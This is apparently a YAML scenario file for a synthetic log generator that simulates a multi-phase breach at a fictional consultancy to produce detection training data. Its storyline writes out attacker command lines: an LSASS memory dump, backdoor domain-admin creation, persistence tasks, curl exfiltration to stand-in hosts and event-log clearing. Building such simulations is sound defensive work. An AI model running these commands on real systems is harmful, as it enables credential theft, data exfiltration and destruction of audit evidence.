version: "1.0"
name: full-coverage-corporate-breach
description: >
  Pinnacle Dynamics corporate breach scenario. A compromised developer account
  is used by an external threat actor to conduct reconnaissance, credential
  harvesting, lateral movement through RDP and SSH, privilege escalation via
  backdoor account creation, data staging on a file server, and exfiltration
  through both direct HTTPS and a compromised DMZ web server. Designed for
  maximum log format and sensor coverage: two Zeek sensors with non-identical
  visibility, a Snort IDS on the perimeter, an outbound HTTP proxy, an
  internal-only web server, and a DMZ-facing web server.

environment:
  description: >
    Mid-size technology consultancy (Pinnacle Dynamics) with Windows AD domain,
    Linux servers, segmented network. 10 employees across engineering, finance,
    IT, and executive roles. Outbound web traffic routed through a forward proxy.
    DMZ hosts a public-facing web application. Internal wiki/knowledge base
    accessible only from corporate LAN.
  timezone:
    default: "America/New_York"
    overrides:
      - pattern: "DMZ-*"
        timezone: "UTC"
      - pattern: "PROXY-*"
        timezone: "UTC"

  users:
    - username: akovacs
      full_name: "Andrei Kovacs"
      email: andrei.kovacs@pinnacledyn.com
      persona: developer
      primary_system: WS-DEV-01
    - username: mnguyen
      full_name: "Mai Nguyen"
      email: mai.nguyen@pinnacledyn.com
      persona: developer
      primary_system: WS-DEV-02
    - username: jreeves
      full_name: "Jordan Reeves"
      email: jordan.reeves@pinnacledyn.com
      persona: sysadmin
      primary_system: WS-IT-01
    - username: cmorales
      full_name: "Carmen Morales"
      email: carmen.morales@pinnacledyn.com
      persona: security_analyst
      primary_system: WS-SEC-01
    - username: tobianski
      full_name: "Tomasz Obianski"
      email: tomasz.obianski@pinnacledyn.com
      persona: executive
      primary_system: WS-EXEC-01
    - username: lchandra
      full_name: "Lakshmi Chandra"
      email: lakshmi.chandra@pinnacledyn.com
      persona: analyst
      primary_system: WS-FIN-01
    - username: bwatson
      full_name: "Brianna Watson"
      email: brianna.watson@pinnacledyn.com
      persona: accountant
      primary_system: WS-FIN-02
    - username: rkim
      full_name: "Ryan Kim"
      email: ryan.kim@pinnacledyn.com
      persona: help_desk
      primary_system: WS-IT-02
    - username: fdelacroix
      full_name: "Fabienne Delacroix"
      email: fabienne.delacroix@pinnacledyn.com
      persona: project_manager
      primary_system: WS-PM-01
    - username: oibrahim
      full_name: "Omar Ibrahim"
      email: omar.ibrahim@pinnacledyn.com
      persona: data_analyst
      primary_system: WS-DATA-01

  service_accounts:
    - svc-backup
    - svc-monitor

  systems:
    # Workstations
    - hostname: WS-DEV-01
      ip: "10.1.10.21"
      os: "Windows 10 Enterprise 22H2"
      type: workstation
      assigned_user: akovacs
    - hostname: WS-DEV-02
      ip: "10.1.10.22"
      os: "Windows 10 Enterprise 22H2"
      type: workstation
      assigned_user: mnguyen
    - hostname: WS-IT-01
      ip: "10.1.10.23"
      os: "Windows 10 Enterprise 22H2"
      type: workstation
      assigned_user: jreeves
    - hostname: WS-SEC-01
      ip: "10.1.10.24"
      os: "Windows 10 Enterprise 22H2"
      type: workstation
      assigned_user: cmorales
    - hostname: WS-EXEC-01
      ip: "10.1.10.25"
      os: "Windows 10 Enterprise 22H2"
      type: workstation
      assigned_user: tobianski
    - hostname: WS-FIN-01
      ip: "10.1.10.26"
      os: "Windows 10 Enterprise 22H2"
      type: workstation
      assigned_user: lchandra
    - hostname: WS-FIN-02
      ip: "10.1.10.27"
      os: "Windows 10 Enterprise 22H2"
      type: workstation
      assigned_user: bwatson
    - hostname: WS-IT-02
      ip: "10.1.10.28"
      os: "Windows 10 Enterprise 22H2"
      type: workstation
      assigned_user: rkim
    - hostname: WS-PM-01
      ip: "10.1.10.29"
      os: "Windows 10 Enterprise 22H2"
      type: workstation
      assigned_user: fdelacroix
    - hostname: WS-DATA-01
      ip: "10.1.10.30"
      os: "Windows 10 Enterprise 22H2"
      type: workstation
      assigned_user: oibrahim

    # Servers — corporate
    - hostname: DC-01
      ip: "10.1.30.10"
      os: "Windows Server 2022"
      type: domain_controller
      services: [active_directory, dns, kerberos]
    - hostname: FILE-SRV-01
      ip: "10.1.30.11"
      os: "Windows Server 2022"
      type: server
      services: [file_share, smb]
    - hostname: DB-01
      ip: "10.1.30.12"
      os: "Linux Ubuntu 22.04"
      type: server
      services: [postgresql]
    - hostname: WIKI-01
      ip: "10.1.30.13"
      os: "Linux Ubuntu 22.04"
      type: server
      services: [nginx, web]
      roles: [web_server]

    # DMZ
    - hostname: DMZ-WEB-01
      ip: "10.1.20.10"
      os: "Linux Ubuntu 22.04"
      type: server
      services: [nginx, web]
      roles: [web_server]

    # Proxy / edge
    - hostname: PROXY-01
      ip: "10.1.40.10"
      os: "Linux Ubuntu 22.04"
      type: server
      services: [squid]
      roles: [forward_proxy]

  groups:
    - name: Domain Admins
      members: [jreeves]
      permissions: [full_admin]
    - name: Engineering
      members: [akovacs, mnguyen]
      permissions: [code_repos, dev_servers]
    - name: IT Operations
      members: [jreeves, rkim]
      permissions: [server_access, workstation_admin]
    - name: Finance
      members: [tobianski, lchandra, bwatson]
      permissions: [file_share_read, financial_data]
    - name: Security
      members: [cmorales]
      permissions: [siem_access, log_review]

  network:
    segments:
      - name: workstations
        cidr: "10.1.10.0/24"
        systems: [WS-DEV-01, WS-DEV-02, WS-IT-01, WS-SEC-01, WS-EXEC-01, WS-FIN-01, WS-FIN-02, WS-IT-02, WS-PM-01, WS-DATA-01]
      - name: servers
        cidr: "10.1.30.0/24"
        systems: [DC-01, FILE-SRV-01, DB-01, WIKI-01]
      - name: dmz
        cidr: "10.1.20.0/24"
        systems: [DMZ-WEB-01]
        exposure: both
      - name: proxy
        cidr: "10.1.40.0/24"
        systems: [PROXY-01]
    sensors:
      # Core switch SPAN — sees workstation <-> server traffic (NOT DMZ)
      - name: core-zeek
        type: network
        hostname: SENSOR-CORE
        placement: span
        monitoring_segments: [workstations, servers]
        direction: bidirectional
        log_formats: [zeek]
      # DMZ tap — sees DMZ <-> internet and DMZ <-> servers
      - name: dmz-zeek
        type: network
        hostname: SENSOR-DMZ
        placement: tap
        monitoring_segments: [dmz, proxy]
        direction: bidirectional
        log_formats: [zeek]
      # Perimeter IDS — sees inbound to DMZ
      - name: perimeter-snort
        type: ids
        hostname: SENSOR-IDS
        placement: tap
        monitoring_segments: [dmz]
        direction: inbound
        log_formats: [snort_alert]

personas:
  - name: developer
    description: "Software developer working on internal applications and services"
    work_hours: "9am-7pm"
    typical_activities: [coding, git_operations, web_browsing, database_queries]
    risk_profile: low
  - name: sysadmin
    description: "Senior systems administrator managing infrastructure and AD"
    work_hours: "7am-6pm"
    typical_activities: [system_monitoring, server_maintenance, user_support, security_patching]
    risk_profile: medium
  - name: security_analyst
    description: "Security analyst monitoring alerts and investigating incidents"
    work_hours: "7am-4pm"
    typical_activities: [log_review, web_browsing, system_monitoring, security_tools]
    risk_profile: low
  - name: executive
    description: "C-level executive with access to sensitive business data"
    work_hours: "7:30am-5pm"
    typical_activities: [email, web_browsing, document_editing, video_conferencing]
    risk_profile: low
  - name: analyst
    description: "Financial analyst running reports and querying databases"
    work_hours: "8am-5:30pm"
    typical_activities: [database_queries, spreadsheet_work, report_generation, web_browsing]
    risk_profile: low
  - name: accountant
    description: "Staff accountant processing transactions and reconciliation"
    work_hours: "8am-5pm"
    typical_activities: [spreadsheet_work, email, web_browsing, document_editing]
    risk_profile: low
  - name: help_desk
    description: "Help desk technician handling tickets and user support"
    work_hours: "8am-5pm"
    typical_activities: [ticketing_system, remote_support, email, web_browsing]
    risk_profile: low
  - name: project_manager
    description: "Project manager tracking deliverables and coordinating teams"
    work_hours: "8am-6pm (lunch 12pm-1pm)"
    typical_activities: [email, web_browsing, document_editing, video_conferencing]
    risk_profile: low
  - name: data_analyst
    description: "Data analyst writing scripts and querying large datasets"
    work_hours: "9am-6pm (lunch 12pm-1pm)"
    typical_activities: [database_queries, web_browsing, coding, report_generation]
    risk_profile: medium

time_window:
  start: "2024-09-17T12:00:00Z"
  duration: "12h"

baseline_activity:
  description: "Normal Tuesday business activity at Pinnacle Dynamics — morning through evening"
  intensity: medium
  variation: medium

storyline:
  # ===== Phase 1: Initial Access — compromised developer credentials (T+30m) =====
  - id: init-access-01
    time: "+30m"
    actor: akovacs
    system: WS-DEV-01
    activity: "Threat actor uses stolen akovacs credentials to log in remotely"
    events:
      - type: logon
        logon_type: 10
        source_ip: "198.51.100.77"
      - type: connection
        dst_ip: "10.1.10.21"
        dst_port: 3389
        source_ip: "198.51.100.77"

  # ===== Phase 2: Reconnaissance (T+45m to T+1h30m) =====
  - id: recon-01
    time: "+45m"
    actor: akovacs
    system: WS-DEV-01
    activity: "Local enumeration — whoami, network config, domain info"
    events:
      - type: process
        process_name: "C:\\Windows\\System32\\whoami.exe"
        command_line: "whoami /all"
      - type: process
        process_name: "C:\\Windows\\System32\\ipconfig.exe"
        command_line: "ipconfig /all"
      - type: process
        process_name: "C:\\Windows\\System32\\systeminfo.exe"
        command_line: "systeminfo"

  - id: recon-02
    time: "+55m"
    actor: akovacs
    system: WS-DEV-01
    activity: "AD enumeration — domain admins, group policy, trust"
    events:
      - type: process
        process_name: "C:\\Windows\\System32\\net.exe"
        command_line: "net group \"Domain Admins\" /domain"
      - type: process
        process_name: "C:\\Windows\\System32\\net.exe"
        command_line: "net group \"Enterprise Admins\" /domain"
      - type: process
        process_name: "C:\\Windows\\System32\\nltest.exe"
        command_line: "nltest /dclist:pinnacledyn.com"
      - type: connection
        dst_ip: "10.1.30.10"
        dst_port: 389
        service: ldap

  - id: recon-03
    time: "+1h10m"
    actor: akovacs
    system: WS-DEV-01
    activity: "Network share and service enumeration"
    events:
      - type: process
        process_name: "C:\\Windows\\System32\\net.exe"
        command_line: "net view \\\\FILE-SRV-01 /all"
      - type: connection
        dst_ip: "10.1.30.11"
        dst_port: 445
        service: smb
      - type: process
        process_name: "C:\\Windows\\System32\\nslookup.exe"
        command_line: "nslookup -type=SRV _kerberos._tcp.pinnacledyn.com"
      - type: connection
        dst_ip: "10.1.30.10"
        dst_port: 53
        service: dns

  # ===== Phase 3: Credential Access (T+1h45m to T+2h30m) =====
  - id: cred-01
    time: "+1h45m"
    actor: akovacs
    system: WS-DEV-01
    activity: "Password spray against finance and executive accounts"
    events:
      - type: failed_logon
        target_username: tobianski
        logon_type: 3
        source_ip: "10.1.10.21"
      - type: failed_logon
        target_username: lchandra
        logon_type: 3
        source_ip: "10.1.10.21"
      - type: failed_logon
        target_username: bwatson
        logon_type: 3
        source_ip: "10.1.10.21"
      - type: failed_logon
        target_username: tobianski
        logon_type: 3
        source_ip: "10.1.10.21"

  - id: cred-02
    time: "+2h10m"
    actor: akovacs
    system: DC-01
    activity: "Credential dumping via LSASS on domain controller"
    events:
      - type: logon
        logon_type: 3
        source_ip: "10.1.10.21"
      - type: process
        process_name: "C:\\Windows\\System32\\rundll32.exe"
        command_line: "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 636 C:\\Temp\\lsass.dmp full"
      - type: create_remote_thread
        target_process: "C:\\Windows\\System32\\lsass.exe"

  # ===== Phase 4: Lateral Movement (T+2h45m to T+4h) =====
  - id: lateral-01
    time: "+2h45m"
    actor: akovacs
    system: FILE-SRV-01
    activity: "RDP to file server using harvested credentials"
    events:
      - type: rdp_session
        source_ip: "10.1.10.21"
      - type: process
        process_name: "C:\\Windows\\System32\\cmd.exe"
        command_line: "cmd.exe /c dir \\\\FILE-SRV-01\\Finance$ /s /b"
      - type: connection
        dst_ip: "10.1.30.11"
        dst_port: 445
        service: smb

  - id: lateral-02
    time: "+3h15m"
    actor: akovacs
    system: DB-01
    activity: "SSH to database server and dump financial records"
    events:
      - type: ssh_session
        source_ip: "10.1.10.21"
      - type: process
        process_name: "/usr/bin/psql"
        command_line: "psql -U app_readonly -d finance -c \"COPY (SELECT * FROM invoices WHERE total > 50000) TO '/tmp/invoices_export.csv' CSV HEADER\""
      - type: connection
        dst_ip: "10.1.30.12"
        dst_port: 5432
        service: postgresql

  - id: lateral-03
    time: "+3h40m"
    actor: akovacs
    system: DMZ-WEB-01
    activity: "SSH pivot to DMZ web server for later exfiltration staging"
    events:
      - type: ssh_session
        source_ip: "10.1.30.12"
      - type: process
        process_name: "/usr/bin/curl"
        command_line: "curl -s http://169.254.169.254/latest/meta-data/"
      - type: process
        process_name: "/usr/bin/find"
        command_line: "find /var/www -name '*.conf' -type f"

  - id: lateral-04
    time: "+4h"
    actor: akovacs
    system: WIKI-01
    activity: "SSH to internal wiki to access knowledge base"
    events:
      - type: ssh_session
        source_ip: "10.1.10.21"
      - type: process
        process_name: "/usr/bin/grep"
        command_line: "grep -r 'password\\|credential\\|api.key' /var/www/wiki/data/"

  # ===== Phase 5: Privilege Escalation & Persistence (T+4h30m to T+5h30m) =====
  - id: privesc-01
    time: "+4h30m"
    actor: akovacs
    system: DC-01
    activity: "Create backdoor service account"
    events:
      - type: logon
        logon_type: 3
        source_ip: "10.1.10.21"
      - type: process
        process_name: "C:\\Windows\\System32\\net.exe"
        command_line: "net user svc-deploy Str0ngP@ss2024! /add /domain"
      - type: account_created
        target_username: svc-deploy

  - id: privesc-02
    time: "+4h35m"
    actor: akovacs
    system: DC-01
    activity: "Add backdoor account to Domain Admins"
    events:
      - type: process
        process_name: "C:\\Windows\\System32\\net.exe"
        command_line: "net group \"Domain Admins\" svc-deploy /add /domain"
      - type: group_member_added
        member_name: svc-deploy
        group_name: "Domain Admins"

  - id: persist-01
    time: "+5h"
    actor: akovacs
    system: FILE-SRV-01
    activity: "Install persistent service on file server"
    events:
      - type: logon
        logon_type: 3
        source_ip: "10.1.10.21"
      - type: process
        process_name: "C:\\Windows\\System32\\sc.exe"
        command_line: "sc create PinnacleSync binPath= \"C:\\Windows\\Temp\\sync-agent.exe\" start= auto"
      - type: service_installed
        service_name: "PinnacleSync"
        service_file_name: "C:\\Windows\\Temp\\sync-agent.exe"

  - id: persist-02
    time: "+5h15m"
    actor: akovacs
    system: DC-01
    activity: "Create scheduled task for C2 callback"
    events:
      - type: process
        process_name: "C:\\Windows\\System32\\schtasks.exe"
        command_line: "schtasks /Create /SC HOURLY /TN \"PinnacleHealthCheck\" /TR \"C:\\Windows\\Temp\\healthcheck.exe\" /RU SYSTEM"
      - type: scheduled_task_created
        task_name: "PinnacleHealthCheck"

  # ===== Phase 6: Data Staging (T+6h to T+7h) =====
  - id: staging-01
    time: "+6h"
    actor: akovacs
    system: WS-DEV-01
    activity: "Copy financial data from file server to local staging"
    events:
      - type: process
        process_name: "C:\\Windows\\System32\\robocopy.exe"
        command_line: "robocopy \\\\FILE-SRV-01\\Finance$\\Q3-2024 C:\\Users\\akovacs\\AppData\\Local\\Temp\\staging /E /Z /R:1"
      - type: connection
        dst_ip: "10.1.30.11"
        dst_port: 445
        service: smb

  - id: staging-02
    time: "+6h20m"
    actor: akovacs
    system: WS-DEV-01
    activity: "Compress and encrypt staged data"
    events:
      - type: process
        process_name: "C:\\Program Files\\7-Zip\\7z.exe"
        command_line: "7z.exe a -pExf1ltr@te! -mhe=on C:\\Users\\akovacs\\Documents\\project-archive.7z C:\\Users\\akovacs\\AppData\\Local\\Temp\\staging\\*"

  # ===== Phase 7: Exfiltration — dual path (T+7h30m to T+8h30m) =====
  - id: exfil-01
    time: "+7h30m"
    actor: akovacs
    system: WS-DEV-01
    activity: "Exfiltrate via HTTPS to external cloud storage (through proxy)"
    events:
      - type: process
        process_name: "C:\\Windows\\System32\\curl.exe"
        command_line: "curl.exe -X PUT -H \"Authorization: Bearer eyJ0eXAiOiJKV1Q...\" -T C:\\Users\\akovacs\\Documents\\project-archive.7z https://storage.mega-upload.io/api/upload"
      - type: connection
        dst_ip: "185.199.108.153"
        dst_port: 443
        service: ssl
      - type: connection
        dst_ip: "104.26.12.88"
        dst_port: 443
        service: ssl

  - id: exfil-02
    time: "+8h"
    actor: akovacs
    system: DMZ-WEB-01
    activity: "Exfiltrate database dump through compromised DMZ web server"
    events:
      - type: ssh_session
        source_ip: "10.1.10.21"
      - type: process
        process_name: "/usr/bin/curl"
        command_line: "curl -X POST -F 'file=@/tmp/invoices_export.csv' https://drop.exfil-node.net/upload"
      - type: connection
        dst_ip: "198.51.100.42"
        dst_port: 443
        service: ssl
      - type: connection
        dst_ip: "198.51.100.42"
        dst_port: 80
        service: http

  # ===== Phase 8: C2 callback pattern (T+9h to T+10h) =====
  - id: c2-01
    time: "+9h"
    actor: akovacs
    system: WS-DEV-01
    activity: "C2 beacon callback — periodic check-in"
    events:
      - type: connection
        dst_ip: "91.219.236.180"
        dst_port: 443
        service: ssl

  - id: c2-02
    time: "+9h30m"
    actor: akovacs
    system: WS-DEV-01
    activity: "Second C2 beacon callback"
    events:
      - type: connection
        dst_ip: "91.219.236.180"
        dst_port: 443
        service: ssl

  - id: c2-03
    time: "+10h"
    actor: akovacs
    system: WS-DEV-01
    activity: "Third C2 beacon with tasking response"
    events:
      - type: connection
        dst_ip: "91.219.236.180"
        dst_port: 443
        service: ssl
      - type: process
        process_name: "C:\\Windows\\System32\\cmd.exe"
        command_line: "cmd.exe /c netstat -ano | findstr ESTABLISHED"

  # ===== Phase 9: Anti-forensics (T+10h30m to T+11h) =====
  - id: antiforensic-01
    time: "+10h30m"
    actor: akovacs
    system: DC-01
    activity: "Clear security event log on domain controller"
    events:
      - type: logon
        logon_type: 3
        source_ip: "10.1.10.21"
      - type: process
        process_name: "C:\\Windows\\System32\\wevtutil.exe"
        command_line: "wevtutil cl Security"
      - type: log_cleared

  - id: antiforensic-02
    time: "+10h40m"
    actor: akovacs
    system: FILE-SRV-01
    activity: "Clear security event log on file server"
    events:
      - type: logon
        logon_type: 3
        source_ip: "10.1.10.21"
      - type: process
        process_name: "C:\\Windows\\System32\\wevtutil.exe"
        command_line: "wevtutil cl Security"
      - type: log_cleared

  - id: antiforensic-03
    time: "+10h50m"
    actor: akovacs
    system: WS-DEV-01
    activity: "Delete local staging directory and tools"
    events:
      - type: process
        process_name: "C:\\Windows\\System32\\cmd.exe"
        command_line: "cmd.exe /c rd /s /q C:\\Users\\akovacs\\AppData\\Local\\Temp\\staging"
      - type: process
        process_name: "C:\\Windows\\System32\\cmd.exe"
        command_line: "cmd.exe /c del /f C:\\Users\\akovacs\\Documents\\project-archive.7z"

  - id: antiforensic-04
    time: "+11h"
    actor: akovacs
    system: DMZ-WEB-01
    activity: "Clean up exfiltration traces on DMZ server"
    events:
      - type: ssh_session
        source_ip: "10.1.10.21"
      - type: process
        process_name: "/bin/rm"
        command_line: "rm -f /tmp/invoices_export.csv"
      - type: process
        process_name: "/usr/bin/find"
        command_line: "find /var/log -name '*.log' -mmin -120 -exec truncate -s 0 {} \\;"

  # ===== Phase 10: Disconnect (T+11h30m) =====
  - id: disconnect-01
    time: "+11h30m"
    actor: akovacs
    system: WS-DEV-01
    activity: "Threat actor disconnects from compromised workstation"
    events:
      - type: logoff

output:
  logs:
    - format: windows
    - format: zeek
    - format: ecar
    - format: syslog
    - format: bash_history
    - format: snort_alert
    - format: web_access
    - format: proxy_access
  destination: ./output
